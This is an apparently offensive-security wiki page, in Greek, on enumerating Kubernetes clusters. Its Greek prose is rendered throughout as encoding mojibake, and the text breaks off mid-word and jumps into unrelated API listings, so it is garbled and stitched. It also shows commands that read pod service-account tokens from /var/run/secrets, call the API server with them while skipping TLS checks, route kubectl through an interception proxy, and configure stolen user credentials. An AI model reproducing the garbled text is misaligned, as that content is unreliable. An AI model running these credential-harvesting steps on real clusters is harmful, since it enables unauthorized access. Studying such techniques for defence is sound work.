# Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· Kubernetes

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Îµ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

## ÎšÎ¿Ï…Î²Î¬Î´ÎµÏ‚ Kubernetes

Î•Î¬Î½ Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î­Î½Î±Î½ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® Ï€Î¿Ï… Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î± Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î± Kubernetes. Î¤Î¿ token ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÎµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ Ï€Î¿Ï… Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ **`KUBECONFIG`** Î® **Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ `~/.kube`**.

Î£Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î±ÏÏ‡ÎµÎ¯Î± ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ Î¼Îµ **tokens ÎºÎ±Î¹ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Î³Î¹Î± ÏƒÏÎ½Î´ÎµÏƒÎ· ÏƒÏ„Î¿Î½ API server**. Î£Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î±Î½ Ï†Î¬ÎºÎµÎ»Î¿ Î¼Î½Î®Î¼Î·Ï‚ cache Î¼Îµ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î±Î½Î±ÎºÏ„Î·Î¸ÎµÎ¯ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚.

Î•Î¬Î½ Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î­Î½Î± pod Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ Kubernetes, Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î¬Î»Î»Î± Î¼Î­ÏÎ· ÏŒÏ€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ tokens ÎºÎ±Î¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î¿ Ï„ÏÎ­Ï‡Î¿Î½ K8 Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½:

### Tokens Î›Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Î¥Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚

Î ÏÎ¹Î½ ÏƒÏ…Î½ÎµÏ‡Î¯ÏƒÎµÏ„Îµ, ÎµÎ¬Î½ Î´ÎµÎ½ Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï„Î¹ ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Ï…Ï€Î·ÏÎµÏƒÎ¯Î± ÏƒÏ„Î¿ Kubernetes, Î¸Î± ÏƒÎ±Ï‚ Ï€ÏÏŒÏ„ÎµÎ¹Î½Î± Î½Î± **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿ ÏƒÏÎ½Î´ÎµÏƒÎ¼Î¿ ÎºÎ±Î¹ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Ï„Î¿Ï…Î»Î¬Ï‡Î¹ÏƒÏ„Î¿Î½ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ® Ï„Î¿Ï… Kubernetes**.

Î Î±ÏÎ¼Î­Î½Î¿ Î±Ï€ÏŒ Ï„Î·Î½ [Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ·](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) Ï„Î¿Ï… Kubernetes:

_Â«ÎŒÏ„Î±Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Îµ Î­Î½Î± pod, ÎµÎ¬Î½ Î´ÎµÎ½ ÎºÎ±Î¸Î¿ÏÎ¯ÏƒÎµÏ„Îµ Î­Î½Î± Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚, Ï„Î¿Ï… Î±Î½Î±Ï„Î¯Î¸ÎµÏ„Î±Î¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Î¿_ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿Ï‚ _Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ ÏƒÏ„Î¿Î½ Î¯Î´Î¹Î¿ Ï‡ÏÏÎ¿ Î¿Î½Î¿Î¼Î¬Ï„Ï‰Î½.Â»_

ÎŸ **ServiceAccount** ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï€Î¿Ï… Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î¿ Kubernetes ÎºÎ±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Î¼Î¹Î± Ï„Î±Ï…Ï„ÏŒÏ„Î·Ï„Î± Î³Î¹Î± Î´Î¹ÎµÏÎ³Î±ÏƒÎ¯ÎµÏ‚ Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÏƒÎµ Î­Î½Î± pod.\
ÎšÎ¬Î¸Îµ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Î­Ï‡ÎµÎ¹ Î­Î½Î± Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Î±Ï…Ï„ÏŒÎ½ ÎºÎ±Î¹ Î±Ï…Ï„ÏŒ Ï„Î¿ Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î­Î½Î± bearer token. Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± JSON Web Token (JWT), Î¼Î¹Î± Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î³Î¹Î± Ï„Î·Î½ Î±ÏƒÏ†Î±Î»Î® Î±Î½Î±Ï€Î±ÏÎ¬ÏƒÏ„Î±ÏƒÎ· Î±Ï€Î±Î¹Ï„Î®ÏƒÎµÏ‰Î½ Î¼ÎµÏ„Î±Î¾Ï Î´ÏÎ¿ Î¼ÎµÏÏÎ½.

Î£Ï…Î½Î®Î¸Ï‰Ï‚ **Î­Î½Î±Ï‚** Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Ï†Î±ÎºÎ­Î»Î¿Ï…Ï‚:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î± Î±ÏÏ‡ÎµÎ¯Î±:

* **ca.crt**: Î•Î¯Î½Î±Î¹ Ï„Î¿ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÏŒ ca Î³Î¹Î± Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï„Ï‰Î½ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¹ÏÎ½ Ï„Î¿Ï… Kubernetes
* **namespace**: Î¥Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ Ï„Î¿Î½ Ï„ÏÎ­Ï‡Î¿Î½Ï„Î± Ï‡ÏÏÎ¿ Î¿Î½Î¿Î¼Î¬Ï„Ï‰Î½
* **token**: Î ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿ **token Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚** Ï„Î¿Ï… Ï„ÏÎ­Ï‡Î¿Î½Ï„Î¿Ï‚ pod.

Î¤ÏÏÎ± Ï€Î¿Ï… Î­Ï‡ÎµÏ„Îµ Ï„Î¿ token, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿Î½ API server Î¼Î­ÏƒÎ± ÏƒÏ„Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ **`KUBECONFIG`**. Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ `(env | set) | grep -i "kuber|kube`**`"`**

Î¤Î¿ token Ï„Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Ï…Ï€Î¿Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **sa.key** ÎºÎ±Î¹ ÎµÏ€Î¹ÎºÏ…ÏÏÎ½ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ **sa.pub**.

Î ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î± ÏƒÏ„Î¿ **Kubernetes**:

* /etc/kubernetes/pki

Î ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î± ÏƒÏ„Î¿ **Minikube**:

* /var/lib/localkube/certs

### Hot Pods

_**Î¤Î± hot pods ÎµÎ¯Î½Î±Î¹**_ pods Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ Î­Î½Î± Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿ token Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚. ÎˆÎ½Î± Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿ token Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± token Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Î¬Î´ÎµÎ¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡ÎµÏ‚ ÎµÏÎ³Î±ÏƒÎ¯ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Î· Î»Î¯ÏƒÏ„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÏÎ½, Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± pods, ÎºÎ»Ï€.

## RBAC

Î•Î¬Î½ Î´ÎµÎ½ Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï„Î¹ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ **RBAC**, **Î´Î¹Î±Î²Î¬ÏƒÏ„Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î±**.

## Î›Î¯ÏƒÏ„Î± Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ·Ï‚

Î“Î¹Î± Î½Î± Î±Ï€Î±ÏÎ¹Î¸Î¼Î®ÏƒÎµÏ„Îµ Î­Î½Î± Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ K8s Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ Î¼ÎµÏÎ¹ÎºÎ¬ Ï€ÏÎ¬Î³Î¼Î±Ï„Î±:

* ÎˆÎ½Î± **Î­Î³ÎºÏ…ÏÎ¿ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î¿ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚**. Î£Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Î•Î¬Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± **`list`**, ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Î¹Ï„Î®ÏƒÎµÎ¹Ï‚ API Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±Î»Î¿Î³Î¯ÏƒÎµÏ„Îµ Î­Î½Î±Î½ Ï„ÏÏ€Î¿ Ï€ÏŒÏÎ¿Ï… (_ÎµÏ€Î¹Î»Î¿Î³Î® `get` ÏƒÏ„Î¿ `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Î•Î¬Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± **`watch`**, ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Î¹Ï„Î®ÏƒÎµÎ¹Ï‚ API Î³Î¹Î± Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿ÏÎ¸Î·ÏƒÎ· Ï„Ï‰Î½ Ï€ÏŒÏÏ‰Î½:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Î‘Î½Î¿Î¯Î³Î¿Ï…Î½ Î¼Î¹Î± ÏƒÏÎ½Î´ÎµÏƒÎ· ÏÎ¿Î®Ï‚ Ï€Î¿Ï… ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ Ï„Î¿ Ï€Î»Î®ÏÎµÏ‚ Î±ÏÏ‡ÎµÎ¯Î¿ Î¼ÎµÏ„Î±Î²Î¿Î»Î®Ï‚ ÎµÎ½ÏŒÏ‚ Deployment ÎºÎ¬Î¸Îµ Ï†Î¿ÏÎ¬ Ï€Î¿Ï… Î±Î»Î»Î¬Î¶ÎµÎ¹ (Î® ÏŒÏ„Î±Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î­Î½Î± Î½Î­Î¿).

{% hint style="danger" %}
ÎŸÎ¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Ï„Î¿Î»Î­Ï‚ `kubectl` Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎ¿Ï…Î½ Î±Ï€Î»ÏÏ‚ Ï€ÏÏ‚ Î½Î± ÎºÎ±Ï„Î±Î»Î¿Î³Î¯ÏƒÎµÏ„Îµ Ï„Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î±. Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `describe` Î±Î½Ï„Î¯ Î³Î¹Î± Ï„Î·Î½ `get`.
{% endhint %}

### Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ curl

Î‘Ï€ÏŒ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± pod Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±ÏÎºÎµÏ„Î­Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Ï„Î¿ pod Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ kube-api server Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Î¼Î­Î± `kubernetes.default.svc` ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¿ Î´Î¯ÎºÏ„Ï…Î¿ kube ÏƒÏ„Î¿ `/etc/resolv.config` ÏŒÏ€Î¿Ï… Î¸Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… kubernetes DNS server (Ï„Î¿ ".1" Ï„Î·Ï‚ Î¯Î´Î¹Î±Ï‚ Ï€ÎµÏÎ¹Î¿Ï‡Î®Ï‚ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ kube-api endpoint).
{% endhint %}

### Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ kubectl

ÎˆÏ‡Î¿Î½Ï„Î±Ï‚ Ï„Î¿ token ÎºÎ±Î¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… API server, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ kubectl Î® Ï„Î¿ curl Î³Î¹Î± Î½Î± Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏŒÏ€Ï‰Ï‚ Ï€ÎµÏÎ¹Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹ ÎµÎ´Ï:

Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Î¿ APISERVER ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½ÎµÎ¯ Î¼Îµ Ï„Î¿ `https://` ÏƒÏ‡Î®Î¼Î±
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> Î±Î½ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ `https://` ÏƒÏ„Î¿ url, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î»Î¬Î²ÎµÏ„Îµ ÏƒÏ†Î¬Î»Î¼Î± ÏŒÏ€Ï‰Ï‚ Bad Request.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ Ï†ÏÎ»Î»Î¿ Î±Ï€Î±Ï„ÎµÏÎ½Î± kubectl ÎµÎ´Ï**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). ÎŸ ÏƒÏ„ÏŒÏ‡Î¿Ï‚ Ï„Ï‰Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Î¿Ï„Î®Ï„Ï‰Î½ ÎµÎ¯Î½Î±Î¹ Î½Î± Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬ÏƒÎ¿Ï…Î½ Î¼Îµ Ï„Î±Î¾Î¹Î½Î¿Î¼Î·Î¼Î­Î½Î¿ Ï„ÏÏŒÏ€Î¿ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ ÎµÏ€Î¹Î»Î¿Î³Î­Ï‚ Î³Î¹Î± Î½Î± Î±Ï€Î±ÏÎ¹Î¸Î¼Î®ÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± ÎºÎ±Ï„Î±Î½Î¿Î®ÏƒÎµÏ„Îµ Ï„Î¿ Î½Î­Î¿ K8s ÏƒÏ„Î¿ Î¿Ï€Î¿Î¯Î¿ Î­Ï‡ÎµÏ„Îµ Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·.

Î“Î¹Î± Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± HTTP Ï€Î¿Ï… ÏƒÏ„Î­Î»Î½ÎµÎ¹ Ï„Î¿ `kubectl` Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `-v=8`

#### MitM kubectl - Î ÏÎ¿Î¾ÎµÎ½ÎµÎ¯Î± Ï„Î¿Ï… kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Î¤ÏÎ­Ï‡Î¿Ï…ÏƒÎ± Î”Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Î•Î¬Î½ ÎºÎ±Ï„Î±Ï†Î­ÏÎ±Ï„Îµ Î½Î± ÎºÎ»Î­ÏˆÎµÏ„Îµ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î¿ÏÎ¹ÏƒÎ¼Î­Î½Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î± **Î´Î¹Î±Î¼Î¿ÏÏ†ÏÏƒÎµÏ„Îµ Ï„Î¿Ï€Î¹ÎºÎ¬** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÎºÎ¬Ï„Î¹ ÏŒÏ€Ï‰Ï‚:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
